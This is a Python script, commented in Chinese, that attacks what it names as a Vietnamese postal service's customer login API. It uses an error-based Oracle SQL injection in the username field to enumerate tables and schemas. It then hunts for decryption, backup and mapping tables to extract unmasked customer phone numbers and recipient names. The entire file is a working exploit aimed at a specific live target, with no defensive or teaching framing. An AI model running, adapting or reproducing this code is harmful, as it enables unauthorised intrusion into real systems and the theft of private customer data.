#!/usr/bin/env python3
"""
查找专门用于解密的表
包括：
1. 解密映射表（脱敏值 -> 真实值）
2. 密钥表
3. 备份表（未脱敏的原始数据）
4. 日志表（记录解密操作）
"""

import requests
import json
import time

class DecryptTableFinder:
    def __init__(self, target_url):
        self.target_url = target_url
        self.session = requests.Session()
        self.session.headers.update({
            'Content-Type': 'application/json',
            'User-Agent': 'Mozilla/5.0'
        })
    
    def inject(self, payload):
        data = {"Username": payload, "Password": "test"}
        try:
            return self.session.post(self.target_url, data=json.dumps(data), timeout=30)
        except:
            return None
    
    def extract_via_error(self, query):
        payload = (
            f"'||(SELECT CHR(77) FROM DUAL WHERE 1=1 AND "
            f"1325=CTXSYS.DRITHSX.SN(1325,"
            f"(CHR(113)||CHR(106)||CHR(118)||CHR(106)||CHR(113)||"
            f"({query})||"
            f"CHR(113)||CHR(107)||CHR(118)||CHR(122)||CHR(113))))||'"
        )
        
        response = self.inject(payload)
        if response:
            text = response.text
            try:
                if 'qjvjq' in text and 'qkvzq' in text:
                    start = text.index('qjvjq') + 5
                    end = text.index('qkvzq', start)
                    return text[start:end]
            except:
                pass
        return None
    
    def search_decrypt_tables(self):
        """搜索包含decrypt/unmask关键词的表"""
        print("=" * 80)
        print("🔍 搜索解密相关的表")
        print("=" * 80)
        
        keywords = [
            'DECRYPT',
            'UNMASK', 
            'REAL',
            'ORIGINAL',
            'BACKUP',
            'RAW',
            'UNMASKED',
            'PLAIN',
            'CLEAR',
        ]
        
        found_tables = []
        
        for keyword in keywords:
            print(f"\n{'='*80}")
            print(f"关键词: {keyword}")
            print(f"{'='*80}")
            
            # 搜索表名包含关键词
            query = f"SELECT TABLE_NAME FROM USER_TABLES WHERE TABLE_NAME LIKE '%{keyword}%' AND ROWNUM<=5"
            result = self.extract_via_error(query)
            
            if result and result != 'NULL':
                print(f"  ✅ 找到: {result}")
                found_tables.append(result)
            else:
                print(f"  未找到")
            
            time.sleep(1)
        
        return found_tables
    
    def search_mapping_tables(self):
        """搜索映射表（存储脱敏值和真实值对应关系）"""
        print("\n" + "=" * 80)
        print("🔍 搜索映射表")
        print("=" * 80)
        
        keywords = [
            'MAP',
            'MAPPING',
            'RELATION',
            'CONVERT',
            'TRANSFORM',
            'ENCODE',
        ]
        
        for keyword in keywords:
            print(f"\n关键词: {keyword}")
            
            query = f"SELECT TABLE_NAME FROM USER_TABLES WHERE TABLE_NAME LIKE '%{keyword}%' AND ROWNUM<=5"
            result = self.extract_via_error(query)
            
            if result and result != 'NULL':
                print(f"  ✅ {result}")
            
            time.sleep(1)
    
    def check_known_decrypt_tables(self):
        """检查已知的可能包含解密数据的表"""
        print("\n" + "=" * 80)
        print("🔍 检查已知表的解密能力")
        print("=" * 80)
        
        tables_to_check = [
            'E1E2_PH_DECRYPT_DATA',
            'E1E2_PH_TEMP_DATA2_LOG',
            'E1E2_PH_ORIGINAL',
            'E1E2_PH_RAW',
            'E1E2_PH_BACKUP',
            'E1E2_PH_REAL',
            'SHIPMENT_DECRYPT',
            'SHIPMENT_ORIGINAL',
            'PHONE_MAPPING',
            'PHONE_DECRYPT',
            'DATA_MASK_MAPPING',
        ]
        
        date = '20251010'
        
        for table in tables_to_check:
            print(f"\n{'='*80}")
            print(f"表: EMS.{table}")
            print(f"{'='*80}")
            
            # 检查表是否存在
            query_exist = f"SELECT COUNT(*) FROM USER_TABLES WHERE TABLE_NAME='{table}'"
            exists = self.extract_via_error(query_exist)
            
            if exists and exists != '0':
                print(f"  ✅ 表存在！")
                
                # 检查是否有10月10日数据
                time.sleep(1)
                query_count = f"SELECT COUNT(*) FROM EMS.{table} WHERE NGAY='{date}'"
                count = self.extract_via_error(query_count)
                
                if count:
                    print(f"  📊 10月10日数据量: {count}")
                    
                    if count != '0':
                        # 获取样本
                        time.sleep(1)
                        query_sample = f"SELECT MABC||'|'||DIENTHOAINHAN FROM EMS.{table} WHERE NGAY='{date}' AND ROWNUM=1"
                        sample = self.extract_via_error(query_sample)
                        
                        if sample:
                            parts = sample.split('|')
                            mabc = parts[0] if len(parts) > 0 else ''
                            phone = parts[1] if len(parts) > 1 else ''
                            
                            print(f"  样本:")
                            print(f"    MABC: {mabc}")
                            print(f"    电话: {phone}")
                            
                            # 判断是否脱敏
                            if phone and '+' not in phone and 'x' not in phone and len(phone) >= 10:
                                print(f"    🎉 这是真实电话！找到解密表了！")
                            else:
                                print(f"    ❌ 仍然脱敏")
            else:
                print(f"  ❌ 表不存在")
            
            time.sleep(2)
    
    def search_all_tables_with_phone(self):
        """搜索所有包含电话字段的表"""
        print("\n" + "=" * 80)
        print("📞 搜索所有包含电话字段的表")
        print("=" * 80)
        
        phone_fields = [
            'DIENTHOAINHAN',
            'RECEIVER_PHONE',
            'PHONE',
            'TELEPHONE',
            'MOBILE',
        ]
        
        for field in phone_fields:
            print(f"\n{'='*80}")
            print(f"字段: {field}")
            print(f"{'='*80}")
            
            # 查找包含此字段的表
            query = f"SELECT TABLE_NAME FROM USER_TAB_COLUMNS WHERE COLUMN_NAME='{field}' AND ROWNUM<=10"
            result = self.extract_via_error(query)
            
            if result and result != 'NULL':
                print(f"  ✅ 包含此字段的表: {result}")
                
                # 检查这个表的电话是否脱敏
                time.sleep(1)
                query_sample = f"SELECT {field} FROM EMS.{result} WHERE {field} IS NOT NULL AND ROWNUM=1"
                phone = self.extract_via_error(query_sample)
                
                if phone:
                    print(f"  样本电话: {phone}")
                    
                    if '+' not in phone and 'x' not in phone and len(phone) >= 10:
                        print(f"  🎉 未脱敏！可能是解密表！")
            else:
                print(f"  未找到")
            
            time.sleep(2)
    
    def check_other_schemas(self):
        """检查其他schema是否有解密表"""
        print("\n" + "=" * 80)
        print("🗄️  检查其他SCHEMA")
        print("=" * 80)
        
        # 查看所有可访问的schema
        query = f"SELECT DISTINCT OWNER FROM ALL_TABLES WHERE OWNER NOT IN ('SYS','SYSTEM','CTXSYS','MDSYS','OLAPSYS','WMSYS') AND ROWNUM<=10"
        schemas = self.extract_via_error(query)
        
        if schemas:
            print(f"可访问的SCHEMA: {schemas}")
            
            # 在其他schema中查找E1E2_PH类似的表
            time.sleep(1)
            query2 = f"SELECT OWNER||'.'||TABLE_NAME FROM ALL_TABLES WHERE TABLE_NAME LIKE 'E1E2%' AND OWNER!=USER AND ROWNUM<=5"
            other_tables = self.extract_via_error(query2)
            
            if other_tables:
                print(f"其他schema的E1E2表: {other_tables}")
        
        time.sleep(2)
    
    def analyze_decrypt_data_table_deeply(self):
        """深入分析E1E2_PH_DECRYPT_DATA表"""
        print("\n" + "=" * 80)
        print("🔬 深入分析 E1E2_PH_DECRYPT_DATA 表")
        print("=" * 80)
        
        table = 'E1E2_PH_DECRYPT_DATA'
        
        queries = [
            ("总记录数", f"SELECT COUNT(*) FROM EMS.{table}"),
            ("最新日期", f"SELECT MAX(NGAY) FROM EMS.{table}"),
            ("最早日期", f"SELECT MIN(NGAY) FROM EMS.{table}"),
            ("表结构-字段数", f"SELECT COUNT(*) FROM USER_TAB_COLUMNS WHERE TABLE_NAME='{table}'"),
            ("是否有ID", f"SELECT COUNT(*) FROM USER_TAB_COLUMNS WHERE TABLE_NAME='{table}' AND COLUMN_NAME='ID'"),
        ]
        
        for name, query in queries:
            print(f"\n🔎 {name}:")
            result = self.extract_via_error(query)
            if result:
                print(f"   {result}")
            time.sleep(1)
        
        # 获取最新数据样本
        print(f"\n🔎 最新数据样本:")
        query_latest = f"SELECT MABC||'|'||NGAY||'|'||DIENTHOAINHAN||'|'||NGUOINHAN FROM (SELECT * FROM EMS.{table} ORDER BY NGAY DESC) WHERE ROWNUM<=3"
        samples = self.extract_via_error(query_latest)
        
        if samples:
            print(f"   {samples}")
        
        time.sleep(2)
        
        # 检查是否有索引
        print(f"\n🔎 表索引:")
        query_index = f"SELECT INDEX_NAME FROM USER_INDEXES WHERE TABLE_NAME='{table}' AND ROWNUM<=3"
        indexes = self.extract_via_error(query_index)
        
        if indexes:
            print(f"   {indexes}")
    
    def find_temp_tables(self):
        """查找临时表或中间表"""
        print("\n" + "=" * 80)
        print("📋 查找临时表/中间表")
        print("=" * 80)
        
        keywords = [
            'TEMP',
            'TMP',
            'STAGING',
            'BUFFER',
            'CACHE',
            'WORK',
        ]
        
        for keyword in keywords:
            print(f"\n关键词: {keyword}")
            
            query = f"SELECT TABLE_NAME FROM USER_TABLES WHERE TABLE_NAME LIKE '%{keyword}%' AND ROWNUM<=3"
            result = self.extract_via_error(query)
            
            if result and result != 'NULL':
                print(f"  ✅ {result}")
                
                # 检查样本数据
                time.sleep(1)
                query_sample = f"SELECT ROWNUM FROM EMS.{result} WHERE ROWNUM=1"
                has_data = self.extract_via_error(query_sample)
                
                if has_data:
                    print(f"    有数据")
            
            time.sleep(1)
    
    def run_search(self):
        """执行完整搜索"""
        print("=" * 80)
        print("🔍 全面搜索解密表")
        print("=" * 80)
        
        print("\n🔌 测试连接...")
        response = self.inject("admin")
        if not response:
            print("❌ 无法连接到目标")
            return
        print(f"✅ 连接成功\n")
        
        # 执行所有搜索
        self.search_decrypt_tables()
        self.search_mapping_tables()
        self.check_known_decrypt_tables()
        self.search_all_tables_with_phone()
        self.check_other_schemas()
        self.analyze_decrypt_data_table_deeply()
        self.find_temp_tables()
        
        print("\n" + "=" * 80)
        print("🎉 搜索完成！")
        print("=" * 80)

if __name__ == "__main__":
    target_url = "https://customerconnect.ems.com.vn/api/User_Customer/Login"
    finder = DecryptTableFinder(target_url)
    finder.run_search()
